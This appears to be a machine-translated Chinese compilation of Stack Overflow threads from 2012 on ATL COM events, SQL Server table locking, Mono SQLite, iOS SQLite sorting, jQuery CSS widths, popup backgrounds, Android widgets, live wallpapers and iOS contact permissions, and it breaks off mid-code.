extern _ATL_FUNC_INFO SomethingHappenedInfo;

// LIBID_MyATLComLib should point to the LIBID of the type library 
class ATL_NO_VTABLE CMyClient :
    public CComObjectRootEx<CComSingleThreadModel>,
    public CComCoClass<CMyClient, &CLSID_MyClient>,
    public IDispatchImpl<IMyClient, &IID_IMyClient, &LIBID_MyATLComLib, /*wMajor =*/ 1, /*wMinor =*/ 0>,
    public IDispEventSimpleImpl<SINK_ID, CMyClient, &MyServer::DIID_IMyEvents>
{
public:

    typedef IDispEventSimpleImpl</*nID =*/ SINK_ID, CMyClient, &MyServer::DIID_IMyEvents> SomethingHappenedEvent;

    ...

    BEGIN_SINK_MAP(CMyClient)
        SINK_ENTRY_INFO(SINK_ID, MyServer::DIID_IMyEvents, 0x1, OnSomethingHappened, &SomethingHappenedInfo)
    END_SINK_MAP()

    ...

private:
    CComQIPtr<MyServer::IMyComServer> mMyComServer; 

public:    
    STDMETHOD(InitHandler)(IUnknown* myserver);
    STDMETHOD(ShutdownHandler)(void);

    void __stdcall OnSomethingHappened(DateTime timestamp, string message);     
}; 
```

一些生成的代码已保留为“...”

## 填写C++代码（MyClient.cpp）

```
_ATL_FUNC_INFO SomethingHappenedInfo = { CC_STDCALL, VT_EMPTY, 2 , {VT_DECIMAL, VT_BSTR} };

STDMETHODIMP CMyClient::InitHandler(IUnknown* myserver)
{
    this->mMyComServer = myserver;
    SomethingHappenedEvent::DispEventAdvise((IDispatch*)this->mMyComServer);

    return S_OK;
}

STDMETHODIMP CMyClient::ShutdownHandler(void)
{    
    SomethingHappenedEvent::DispEventUnadvise(this->mMyComServer);          

    return S_OK;
}

void __stdcall CMyClient::OnSomethingHappened(DateTime timestamp, string message)
{   
    ...
} 
```

请注意，此处的 Advise/Unadvise 调用以不同的方式进行。

# c# - 如何使用 SqlClient 在 ADO.NET/C# 4.0 中解锁 SQL Server 2008 表？

> ID：12648213
> 
> 赞同：2
> 
> 时间：2012-09-28T22:33:35.830
> 
> 标签：c#, sql-server, ado.net, sqlclient

我在后面创建了一个方法：

1.  锁定了一张桌子
2.  从中读取值
3.  写回更新的值
4.  解锁表

该代码适用于 Oracle。现在我无法让它在 SQL Server 2008 上工作。方法如下，执行我的解锁命令会产生一个`SqlException`带有文本的结果：

> *“NOLOC”不是公认的表提示选项。如果它打算作为表值函数或 CHANGETABLE 函数的参数，请确保您的数据库兼容模式设置为 90。*

代码：

```
public static int GetAndSetMaxIdTable(DbProviderFactory factory, DbConnection cnctn, DbTransaction txn, int tableId, string userName, int numberOfIds)
{
        bool isLocked = false;
        string sql = string.Empty;
        string maxIdTableName;

        if (tableId == 0)
            maxIdTableName = "IdMax";
        else
            maxIdTableName = "IdMaxTable";

        try
        {
            bool noPrevRow = false;
            int realMaxId;

            if (factory is OracleClientFactory)
                sql = string.Format("lock table {0} in exclusive mode", maxIdTableName);
            else if (factory is SqlClientFactory)
                sql = string.Format("select * from {0} with (TABLOCKX)", maxIdTableName);
            else
                throw new Exception(string.Format("Unsupported DbProviderFactory -type: {0}", factory.GetType().ToString()));

            using (DbCommand lockCmd = cnctn.CreateCommand())
            {
                lockCmd.CommandText = sql;
                lockCmd.Transaction = txn;
                lockCmd.ExecuteNonQuery();
                isLocked = true;
            }

            using (DbCommand getCmd = cnctn.CreateCommand())
            {
                getCmd.CommandText = CreateSelectCommand(factory, tableId, userName, getCmd, txn);

                object o = getCmd.ExecuteScalar();
                if (o == null)
                {
                    noPrevRow = true;
                    realMaxId = 0;
                }
                else
                {
                    realMaxId = Convert.ToInt32(o);
                }
            }

            using (DbCommand setCmd = cnctn.CreateCommand())
            {
                if (noPrevRow)
                    setCmd.CommandText = CreateInsertCommand(factory, tableId, userName, numberOfIds, realMaxId, setCmd, txn);
                else
                    setCmd.CommandText = CreateUpdateCommand(factory, tableId, userName, numberOfIds, realMaxId, setCmd, txn);

                setCmd.ExecuteNonQuery();
            }
            if (factory is OracleClientFactory)
                sql = string.Format("lock table {0} in share mode", maxIdTableName);
            else if (factory is SqlClientFactory)
                sql = string.Format("select * from {0} with (NOLOC)", maxIdTableName);             

            using (DbCommand lockCmd = cnctn.CreateCommand())
            {
                lockCmd.CommandText = sql;
                lockCmd.Transaction = txn;
                lockCmd.ExecuteNonQuery();
                isLocked = false;
            }

            return realMaxId;
        }
        catch (Exception e)
        {
          ...
        }
} 
```

那么这里出了什么问题呢？这个错误来自哪里？服务器还是客户端？我从 C 代码中复制了该语句，它应该在那里工作。不幸的是，我无法调试并检查它是否适合我。

编辑：只是尝试锁定和解锁（不读取或更新）会导致相同的异常。

谢谢和BR-马蒂

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T16:16:27.323

TABLOCKX 提示按您的意愿锁定表，但您不能手动解锁它。锁定的持续时间取决于您的事务级别。如果您的连接上没有活动事务，则在执行 SELECT 时将持有锁，然后将其丢弃。

如果要实现“锁定表 -> 对表执行操作 -> 释放锁定”的顺序，则需要实现此 T-SQL 脚本的 ADO.NET 等效项：

```
BEGIN TRAN
    SELECT TOP (1) 1 FROM myTable (TABLOCKX, KEEPLOCK)
    -- do something with the table
COMMIT -- This will release the lock, if there is no outer transaction present 
```

您可以通过 DbCommand 对象执行“BEGIN TRAN”/“COMMIT”，也可以使用 System.Data.SqlClient.SqlTransaction 类启动事务并提交。

注意：此方法仅在您的连接未在事务中登记时才有效！SQL Server 不支持嵌套事务，因此 COMMIT 不会做任何事情并且会持有锁。如果您有一个事务已经在运行，则在事务完成之前您不能释放锁。在这种情况下，通过 sp_getapplock/sp_releaseapplock 进行同步可能会有所帮助。

编辑：如果您想了解交易、锁定和阻塞，我推荐这两个视频：[http](http://technet.microsoft.com/en-us/sqlserver/gg545007.aspx) ://technet.microsoft.com/en-us/sqlserver/gg545007.aspx和[http://technet.microsoft.com /en-us/sqlserver/gg508892.aspx](http://technet.microsoft.com/en-us/sqlserver/gg508892.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T07:07:26.633

这是我根据 TToni 的回答制作的 SqlClient 表的答案：

```
 public static int GetAndSetMaxIdTable(DbProviderFactory factory, DbConnection cnctn,   DbTransaction txn, int numberOfIds)
    {
            bool noPrevRow = false;
            int realMaxId;

            using (DbCommand getCmd = cnctn.CreateCommand())
            {
                getCmd.CommandText = "SELECT MaxId FROM IdMax WITH (TABLOCKX)"
                getCmd.Transaction = txn;

                object o = getCmd.ExecuteScalar();
                if (o == null)
                {
                    noPrevRow = true;
                    realMaxId = 0;
                }
                else
                {
                    realMaxId = Convert.ToInt32(o);
                }
            }

            using (DbCommand setCmd = cnctn.CreateCommand())
            {
                if (noPrevRow)
                    setCmd.CommandText = CreateInsertCommand(factory, tableId, userName, numberOfIds, realMaxId, setCmd, txn);
                else
                    setCmd.CommandText = CreateUpdateCommand(factory, tableId, userName, numberOfIds, realMaxId, setCmd, txn);

                setCmd.ExecuteNonQuery();
            }

            return realMaxId;
    } 
```

我是这样的：

```
 ...

        try
        {
            using (txn = cnctn.BeginTransaction())
            {
                oldMaxId = GetAndSetMaxIdTable(factory, cnctn, txn, 5);
                for (i = 0; i < 5; i++)
                {
                    UseNewIdToInsertStuff(factory, cnctn, txn, oldMaxId + i + 1)
                }
                txn.Commit();
                return true;
            }
        }
        catch (Exception e)
        {
            // don't know if this is needed
            if (txn != null && cnctn.State == ConnectionState.Open)
                txn.Rollback();

            throw e;
        }

        ... 
```

对于 oracle 客户端，似乎需要：

```
SELECT MaxId from IdMax WHERE ... FOR UPDATE OF MaxId 
```

-m

# c# - Mono无法打开sqlite数据库

> ID：12648217
> 
> 赞同：2
> 
> 时间：2012-09-28T22:34:00.643
> 
> 标签：c#, sqlite, mono

我正在尝试与 sqlite v3 数据库进行非常基本的连接，并且我正在使用 monodevelop 3.0 和 Mono 2.10 并且无法连接到数据库。我可以让应用程序创建数据库，但是尝试连接它会立即失败。有什么建议么？我从一个不同的数据库开始，但后来决定让我的应用程序尝试创建一个空数据库，然后连接到它。这似乎仍然失败。

```
SqliteConnection.CreateFile("db\\DataWorksProg.s3db");
SqliteConnection conn = new SqliteConnection("Data Source=file:db\\DataWorksProg.s3db");
conn.Open(); 
```

这段小代码失败，出现无法打开数据库文件的错误。

```
Mono.Data.Sqlite.SqliteException: Unable to open the database file 
```

权限看起来不错，我在项目中有 Sqlite3.dll，它似乎工作正常。我错过了什么明显的东西吗？我在 Visual Studio 方面相当出色，但在 Mono/Monodevelop 环境中工作仍然相当新鲜。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-29T01:59:20.377

什么平台？

我不相信你需要创建一个文件。如果没有找到，iirc，它将生成数据库文件。

Fwiw，在Mac上，我正在做（注意`URI`一个非常标准的路径；我没有使用过`Data Source`）......

```
using System;
using System.Data;
using Mono.Data.Sqlite;

namespace test
{
    class MainClass
    {
        public static void Main (string[] args)
        {
            IDbConnection conTemp = null;
            IDbCommand cmdTemp = null;

            conTemp = (IDbConnection)new SqliteConnection ("URI=file:/Users/userName/mnmh.db");
            conTemp.Open ();
            cmdTemp = conTemp.CreateCommand ();         
            cmdTemp.CommandText = "SELECT * FROM employee";
            IDataReader drTemp = cmdTemp.ExecuteReader ();
            while (drTemp.Read()) {
                Console.WriteLine (drTemp.GetString (0));
            }

        }
    }
} 
```

等等等等

检查显而易见的——你已经引用了你正在使用的所有东西，等等。

![需要参考](../Images/35b215503118cba934411a46e265a7f7.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-05T22:46:30.013

在这里发现了我的问题。显然而不是使用

```
"Data Source=file:db\\DataWorksProg.s3db" 
```

我应该一直在使用

```
"URI=file:db\\DataWorksProg.s3db" 
```

切换到 URI 并按预期工作。我从阅读文档中想到，在 2.0 配置文件下，需要 DataSource 部分而不是 URI，但我得到了我正在寻找的结果。

# objective-c - iOS - cellForRowAtIndexPath SQLite 排序数据？

> ID：12648228
> 
> 赞同：1
> 
> 时间：2012-09-28T22:35:21.883
> 
> 标签：objective-c, ios, cocoa-touch, sqlite

我正在尝试使用 SQLite 来保存我的应用程序的数据。该数据库可能包含数千条记录，因此在启动时将它们全部加载到数组中可能不是一个好主意。所以我通过 id 将它们分别加载到 cellForForAtIndexPath 中。这有效，但我无法对它们进行排序......有人能想到更好的方法吗？我敢打赌这真的很简单：L

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"VerbCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    VerbData *verb = [[VerbData alloc] init];
    if(isFiltered)
        verb = [searchResults objectAtIndex:indexPath.row];
    else
    {
        const char *sql = [[NSString stringWithFormat: @"SELECT infinitive, english FROM verbs WHERE id=%d", indexPath.row+1] UTF8String];
        sqlite3_stmt *sqlStatement;
        if(sqlite3_prepare_v2(db, sql, -1, &sqlStatement, NULL) != SQLITE_OK){
            NSLog(@"Problem with prepare statement: %s", sqlite3_errmsg(db));
        }else{
            while (sqlite3_step(sqlStatement) == SQLITE_ROW) {
                verb.infinitive = [NSString stringWithUTF8String:(char *)sqlite3_column_text(sqlStatement,0)];
                verb.english = [NSString stringWithUTF8String:(char *)sqlite3_column_text(sqlStatement,1)];
            }
        }
    }

    cell.textLabel.text = verb.infinitive;
    cell.detailTextLabel.text = verb.english;

    return cell;
} 
```

谢谢（：

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:16:58.237

您应该在 sql 查询中添加“ORDER BY yourField”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:48:39.843

您可以使用偏移量和限制按顺序选择

[SQL Server 中的行偏移量](https://stackoverflow.com/questions/187998/row-offset-in-sql-server)

Belkadmin 是对的，当您使用 ORDER BY [ ASCENDING | DESCENDING ] 所有排序工作都将由 DBMS 完成，如果您有远程数据库，这对移动设备非常有用，因此服务器端将完成所有艰苦的工作。你也可以使用

SELECT ... FROM ... ORDER BY ...偏移限制

其中： offset - 与数据库开头的偏移量 limit - 查询收集的最大数据行数

然后，您可以分块加载表格。其他技巧是在表滚动时异步查询行，即加载前 100 行，但是当用户低于第 70 行时，另一个查询是异步进行的，并将数据添加到数据源数组

# javascript - Javascript 向 CSS 发送动态值

> ID：12648229
> 
> 赞同：2
> 
> 时间：2012-09-28T22:35:24.253
> 
> 标签：javascript, jquery, html, css

我正在使用 Jquery，并且在悬停事件期间动态更新我的 CSS 值时遇到了问题。基本上我希望底部的那条小线可以按比例缩放到 div 的大小。

这是有问题的代码：

```
$('.menu li').hover(function () {
   left = Math.round($(this).offset().left - $('.menu').offset().left);
   //find the current width of the div
   var width_flux = $('.menu #box .head').html($(this).find('img').width());
   //pass value to CSS 
   $('.menu #box .head').css('width', (parseInt(width_flux)) +'px');
   $('#box').stop(false, true).animate({left: left},{duration:500, easing: style}); 

   //if user click on the menu
}); 
```

**和对应的css**

* * *

```
.menu #box .head {
        background: url("http://whoisedward.com/img/bar.png");
        height:3px;
        width:1px;
        color:#eee;

        /* force text display in one line */
        white-space:nowrap;

        /* set the text position manually */
        padding-left:4px;
        padding-top:3px;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:39:21.863

线路有问题

```
 var width_flux = $('.menu #box .head').html($(this).find('img').width()); 
```

`width_flux`is not with but`jQuery`元素。

修改后的代码：假设你想`$(this).find('img').width()`用作`width_flux`

```
$('.menu li').hover(function () {
    left = Math.round($(this).offset().left - $('.menu').offset().left);
    //find the current width of the div
    var width_flux = $(this).find('img').width();
    //pass value to CSS 
    $('.menu #box .head').width(width_flux);
    $('#box').stop(false, true).animate({left: left},{duration:500, easing: style});    

    //if user click on the menu
}) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T22:44:28.873

线

`var width_flux = $('.menu #box .head').html($(this).find('img').width());`

是错的。您将宽度添加到元素，但元素（不是宽度）分配给 width_flux。显然，`<element>px`不是一个明智的 CSS 值。

尝试：

```
width_flux = $(this).find('img').width();
$('.menu #box .head').html(width_flux);
$('.menu #box .head').css('width', width_flux + 'px'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T22:45:13.013

您似乎将值设置为 HTML 而没有得到它

```
var width_flux = $('.menu #box .head').html($(this).find('img').width()); 
```

所以基本上 width_flux 将是一个元素..

而是尝试

```
var width_flux = $(this).find('img').width();

   OR 

var width_flux = $('.menu #box .head').html($(this).find('img').width());

   var width_flux = width_flux.html() ;
    // Then your code 
```

确保检查错误情况

# javascript - 可以将 bgcolor 属性传递给弹出窗口吗？

> ID：12648233
> 
> 赞同：1
> 
> 时间：2012-09-28T22:36:02.903
> 
> 标签：javascript

我有下面的代码来打开一个可以正常工作的弹出窗口。弹出窗口有一个黑色背景，控制在弹出窗口本身代码的主体标签内。

当弹出窗口最初打开时，页面具有白色背景，然后在代码加载后变为黑色。这不会打扰我，但会打扰我的客户！

那么，有没有一种方法可以将`bgcolor`颜色属性从父页面上的 javascript 传递给弹出窗口，以便弹出窗口在打开时立即变为黑色。我希望这是有道理的！

**这是我当前的代码：**

```
// START OF POP UP ///////////////////////////////////////////////////

function PopupCenter(pageURL, title,w,h) {
    var left = (screen.width/2)-(w/2);
    var top = (screen.height/2)-(h/2);
    var targetWin = window.open (pageURL, title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
}

// END OF POP UP ///////////////////////////////////////////////////

<a href="javascript:void(0);" onClick="PopupCenter('page.asp', 'myPop1',678,550);" class="staffBioLinks">Click Here</a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:41:43.203

是的。通过使用这样的东西：

```
<script type="text/javascript">
function PopupCenter(pageURL, title,w,h) {
    var left = (screen.width/2)-(w/2);
    var top = (screen.height/2)-(h/2);
    var targetWin = window.open ('about:blank', title, 'toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no, width='+w+', height='+h+', top='+top+', left='+left);
    targetWin.document.body.style.backgroundColor='#000';
    targetWin.location.href=pageURL;
}
</script> 
```

您打开一个空白页面，然后先设置背景颜色，然后重定向到要加载的 URL。在加载期间，页面是黑色的（在我的示例中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:41:53.400

您可以将其作为查询字符串。如果您可以获得该值，那么它应该就像将其附加到页面 URL 的末尾一样简单。

`page.asp`将会`page.asp?bgColor=xxxxxx`

您可以根据需要处理弹出窗口另一侧的响应。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T22:43:20.563

你可以这样做：

```
targetWin.document.bgColor = 'lightgreen';
targetWin.focus(); 
```

# android - AppWidgets 在自定义启动器中不起作用

> ID：12648237
> 
> 赞同：2
> 
> 时间：2012-09-28T22:36:25.727
> 
> 标签：android, android-widget, android-appwidget

在编写启动器时，我遇到了 appwidgets 的问题。只有时钟小部件正常工作，其他不： ![Android小部件问题](../Images/6fd4b9ca922836388c49c1557bacb7ad.png)

部分代码：

```
final AppWidgetHostView hostView = mAppWidgetHost.createView(this, appWidgetId, providerInfo);

        if (providerInfo.configure != null) {
            // Launch over to configure widget, if needed
            Intent intent = new Intent(AppWidgetManager.ACTION_APPWIDGET_CONFIGURE);
            intent.setComponent(providerInfo.configure);
            intent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, appWidgetId);
            mAppWidgetProviderInfo = providerInfo;

            startActivityForResultSafely(intent, REQUEST_CREATE_APPWIDGET);
        } else {
            // Otherwise just add it
            completeAddAppWidget(appWidgetId, info.container, info.screen, providerInfo);

            // Exit spring loaded mode if necessary after adding the widget
            exitSpringLoadedDragModeDelayed(true, false);
        } 
```

completeAddAppWidget 方法：

```
private void completeAddAppWidget(final int appWidgetId, long container,
                                      int screen, AppWidgetProviderInfo providerInfo) {
        // Calculate the grid spans needed to fit this widget
        CellLayout layout = getCellLayout(container, screen);

        int[] spanXY = getSpanForWidget(providerInfo, null);

        // Try finding open space on Launcher screen
        // We have saved the position to which the widget was dragged-- this
        // really only matters
        // if we are placing widgets on a "spring-loaded" screen
        int[] cellXY = mTmpAddItemCellCoordinates;
        int[] touchXY = mPendingAddInfo.dropPos;
        boolean foundCellSpan = false;
        if (mPendingAddInfo.cellX >= 0 && mPendingAddInfo.cellY >= 0) {
            cellXY[0] = mPendingAddInfo.cellX;
            cellXY[1] = mPendingAddInfo.cellY;
            foundCellSpan = true;
        } else if (touchXY != null) {
            // when dragging and dropping, just find the closest free spot
            int[] result = layout.findNearestVacantArea(touchXY[0], touchXY[1],
                    spanXY[0], spanXY[1], cellXY);
            foundCellSpan = (result != null);
        } else {
            foundCellSpan = layout
                    .findCellForSpan(cellXY, spanXY[0], spanXY[1]);
        }

        if (!foundCellSpan) {
            if (appWidgetId != -1) {
                // Deleting an app widget ID is a void call but writes to disk
                // before returning
                // to the caller...
                new Thread("deleteAppWidgetId") {
                    public void run() {
                        mAppWidgetHost.deleteAppWidgetId(appWidgetId);
                    }
                }.start();
            }
            showOutOfSpaceMessage();
            return;
        }

        // Build Launcher-specific widget info and save to database
        LauncherAppWidgetInfo launcherInfo = new LauncherAppWidgetInfo(
                appWidgetId);
        launcherInfo.spanX = spanXY[0];
        launcherInfo.spanY = spanXY[1];

        LauncherModel.addItemToDatabase(this, launcherInfo, container, screen,
                cellXY[0], cellXY[1], false);

        if (!mRestoring) {
            // Perform actual inflation because we're live
            launcherInfo.hostView = mAppWidgetHost.createView(this,
                    appWidgetId, providerInfo);

            launcherInfo.hostView.setAppWidget(appWidgetId, providerInfo);
            launcherInfo.hostView.setTag(launcherInfo);

            mWorkspace.addInScreen(launcherInfo.hostView, container, screen,
                    cellXY[0], cellXY[1], launcherInfo.spanX,
                    launcherInfo.spanY, isWorkspaceLocked());

            addWidgetToAutoAdvanceIfNeeded(launcherInfo.hostView, providerInfo);
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-12-30T13:50:53.860

我前段时间遇到过这个问题。您必须在每次 appwidget 更改、添加删除等后调用 startListening()。

# android - Android -- 动态壁纸 OPENGL

> ID：12648243
> 
> 赞同：1
> 
> 时间：2012-09-28T22:37:22.047
> 
> 标签：android, opengl-es, live-wallpaper

我创建了一个 OPENGL 活动，它是一个 3D 立方体，可以移动并做不同的事情。我如何使用这个 OPENGL 活动来像使用 android 壁纸一样使用它？你能把链接或其他东西传给我吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T18:26:15.133

一些链接：

[http://www.rbgrn.net/content/354-glsurfaceview-adapted-3d-live-wallpapers](http://www.rbgrn.net/content/354-glsurfaceview-adapted-3d-live-wallpapers)

[http://www.learnopengles.com/how-to-use-opengl-es-2-in-an-android-live-wallpaper/](http://www.learnopengles.com/how-to-use-opengl-es-2-in-an-android-live-wallpaper/)

[http://mindtherobot.com/blog/376/android-ui-making-a-live-wallpaper-fire-simulation/](http://mindtherobot.com/blog/376/android-ui-making-a-live-wallpaper-fire-simulation/)

# iphone - 以编程方式请求访问联系人

> ID：12648244
> 
> 赞同：110
> 
> 时间：2012-09-28T22:37:53.537
> 
> 标签：iphone, objective-c, ios, ios6, contacts

自从更新到 iOS 6 后，我注意到我将联系人添加到 iPhone 通讯录的代码不再有效。我相信这是一个与权限相关的问题，因为 Apple 现在需要用户权限才能访问联系人（修复[此](http://www.cultofmac.com/179733/19-of-ios-apps-access-your-address-book-without-your-permission-until-ios-6-report/)问题）。

我希望该应用程序会自动请求访问联系人的权限，如下面的屏幕截图所示，但事实并非如此。尝试添加联系人只是失败了`ABAddressBookErrorDomain error 1`。

我是否需要以编程方式启动访问联系人请求对话框？这是怎么做的？

![访问联系人](../Images/7d9408fbcf51719257a2bc9a19d1e9c8.png)

* * *

## 回答 #1

> 赞同：181
> 
> 时间：2012-09-29T00:38:15.900

根据苹果网站上的[这个文档](https://developer.apple.com/library/ios/documentation/Contacts/Reference/Contacts_Framework/)（向下滚动到页面中间的隐私），**必须先授予**对地址簿的访问权限，然后才能以编程方式访问它。这就是我最终要做的。

```
 #import <AddressBookUI/AddressBookUI.h>

  // Request authorization to Address Book
  ABAddressBookRef addressBookRef = ABAddressBookCreateWithOptions(NULL, NULL);

  if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusNotDetermined) {
    ABAddressBookRequestAccessWithCompletion(addressBookRef, ^(bool granted, CFErrorRef error) {
      if (granted) {
          // First time access has been granted, add the contact
          [self _addContactToAddressBook];
      } else {
          // User denied access
          // Display an alert telling user the contact could not be added
      }
    });
  }
  else if (ABAddressBookGetAuthorizationStatus() == kABAuthorizationStatusAuthorized) {
    // The user has previously given access, add the contact
    [self _addContactToAddressBook];
  }
  else {
    // The user has previously denied access
    // Send an alert telling user to change privacy setting in settings app
  } 
```

**iOS 9 及更高版本的更新：**

从苹果网站：

> 重要的
> 
> 地址簿 UI 框架在 iOS 9 中已弃用。请改用 ContactsUI 框架中定义的 API。要了解更多信息，请参阅[ContactsUI](https://developer.apple.com/reference/contactsui)

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2012-10-11T11:13:09.180

这对我来说是完美的把戏！

在 iOS6 上，苹果引入了新的隐私控制，用户可以控制每个应用程序对联系人和日历的访问。因此，在代码方面，您需要添加一些方法来请求权限。在iOS5或之前，我们可以随时调用

```
ABAddressBookRef addressBook = ABAddressBookCreate(); 
```

获取地址簿没有任何问题，但是在iOS6中，如果您没有权限，此调用将返回空指针。这就是为什么我们需要更改获取 ABAddressBookRef 的方法。

```
__block BOOL accessGranted = NO;
if (ABAddressBookRequestAccessWithCompletion != NULL) { // we're on iOS 6
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
        accessGranted = granted;
        dispatch_semaphore_signal(sema);
    });
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
    dispatch_release(sema);   
}
else { // we're on iOS 5 or older
    accessGranted = YES;
}

if (accessGranted) {
    // Do whatever you want here.
} 
```

在代码中，信号量用于阻塞直到响应，而 ABAddressBookRequestAccessWithCompletion 将在应用程序之前没有请求的情况下请求权限。否则它将只遵循设置-隐私-联系方式中的设置。

来源： http: [//programmerjoe.blogspot.com/2012/10/ios6-permissions-contacts.html](http://programmerjoe.blogspot.com/2012/10/ios6-permissions-contacts.html)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-09-07T16:16:23.930

对于联系人框架：

```
- (void)checkPermissionForCNContacts
{
    switch ([CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts])
    {
        case CNAuthorizationStatusNotDetermined:
        {
            [[[CNContactStore alloc] init] requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError * _Nullable error) {
                if (granted == YES)
                    [self showCNContactPicker];
            }];
        }
            break;
        case CNAuthorizationStatusRestricted:
        case CNAuthorizationStatusDenied:
                // Show custom alert
            break;
        case CNAuthorizationStatusAuthorized:
            [self showCNContactPicker];
            break;
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-22T08:35:41.620

[Xcode5 中 iOS6.1 上的yunas](https://stackoverflow.com/a/12838224/1933185)代码有一些问题。通过一些[小](http://technet.weblineindia.com/mobile/how-to-pause-or-wait-execution-until-block-executes-with-semaphore-in-ios/)的调整，它对我有用。

问题是 iOS 6 中的 ARC 不允许`dispatch_release(sema);`Here's the working code。注意：我使用`m_addressbook`而不是`addressbook`作为 ABAddressBookRef！

### 视图控制器.m

```
#import "ViewController.h"
#import <AddressBook/AddressBook.h>
#import <AddressBook/ABAddressBook.h>
#import <AddressBook/ABPerson.h>

@interface ViewController ()

@property (nonatomic, strong) NSMutableArray* contactList;

@end

@implementation ViewController

- (void)viewDidLoad
{
  [super viewDidLoad];

  ABAddressBookRef m_addressbook =  ABAddressBookCreateWithOptions(NULL, NULL);

  __block BOOL accessGranted = NO;
  if (ABAddressBookRequestAccessWithCompletion != NULL) { // we're on iOS 6
      dispatch_semaphore_t sema = dispatch_semaphore_create(0);
      dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
          @autoreleasepool {
              // Write your code here...
              // Fetch data from SQLite DB
          }
      });

      ABAddressBookRequestAccessWithCompletion(m_addressbook, ^(bool granted, CFErrorRef error) {
          accessGranted = granted;
          dispatch_semaphore_signal(sema);
      });
      dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
  }
  else { // we're on iOS 5 or older
      accessGranted = YES;
  }

  if (accessGranted) {
  // do your stuff
  }
}

// ... 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-03-21T10:43:05.613

```
ABAddressBookRef addressBook = ABAddressBookCreate();

__block BOOL accessGranted = NO;
if (ABAddressBookRequestAccessWithCompletion != NULL) { // we're on iOS 6
    dispatch_semaphore_t sema = dispatch_semaphore_create(0);
    ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
        accessGranted = granted;
        dispatch_semaphore_signal(sema);
    });
    dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);
    dispatch_release(sema);
}
else { // we're on iOS 5 or older
    accessGranted = YES;
}

if (accessGranted) {
    if(self.isContactsChanged)
    {
        {
            self.isContactsChanged=NO;
            CFArrayRef allPeople = ABAddressBookCopyArrayOfAllPeople(addressBook);
             ABAddressBookRegisterExternalChangeCallback(addressBook, addressBookChanged, self);

            int allPeopleCount = CFArrayGetCount(allPeople);

            NSMutableArray *contactArrTemp = [[NSMutableArray alloc]init];

            __block int noNumberCount=1;
            managedObjectContext = [(AppDelegate *)[[UIApplication sharedApplication] delegate] managedObjectContext];
            newMoc = [[NSManagedObjectContext alloc] init];
            [newMoc setPersistentStoreCoordinator:[[AppDelegate getAppDelegate] persistentStoreCoordinator]];
            [self DeleteAllPhoneContact];
            NSNotificationCenter *notify = [NSNotificationCenter defaultCenter];
            [notify addObserver:self
                       selector:@selector(mergeChanges:)
                           name:NSManagedObjectContextDidSaveNotification
                         object:newMoc];
            self.backgroundQueue = dispatch_queue_create("com.storephonecontacts.bgqueue", NULL);
            __block NSMutableDictionary *dic;
            __block NSString *strTime,*strName,*strMobile,*strEmail,*strNotes;
            __block NSDate *nsDate;
            dispatch_async(self.backgroundQueue, ^{

                NSMutableDictionary *dict =nil;
                for (int i = 0; i < allPeopleCount; i++)
                {

                    dic = [[NSMutableDictionary alloc]init];
                    ABRecordRef record = CFArrayGetValueAtIndex(allPeople,i);
                    NSDate *date = (NSDate*)ABRecordCopyValue(record, kABPersonCreationDateProperty);
                    nsDate = [date retain];

                    NSDateFormatter *formatterTime = [[NSDateFormatter alloc] init];
                    [formatterTime setDateFormat:@"hh.mm"];
                    NSString    *dateStrPhone = [formatterTime stringFromDate:date];
                    strTime = [dateStrPhone retain];
                    [formatterTime release];

                    NSString *name = (NSString*)ABRecordCopyValue(record, kABPersonFirstNameProperty);
                    if([name length]>0)
                        name = [name stringByAppendingString:@" "];
                    NSString *name1 = (NSString*)ABRecordCopyValue(record, kABPersonLastNameProperty);
                    if([name1 length]>0)
                    {
                        if([name length]>0)
                            name = [name stringByAppendingString:name1];
                        else
                            name = (NSString*)ABRecordCopyValue(record, kABPersonLastNameProperty);
                    }
                    if([name length]>0)
                        strName = [name retain];
                    else
                        strName = [@"noName" retain];

                    //to save notes
                    NSString *notes = (NSString*)ABRecordCopyValue(record, kABPersonNoteProperty);
                    if(notes == NULL){
                        strNotes = @"noNotes";
                    }
                    else{
                        strNotes = [notes retain];
                    }
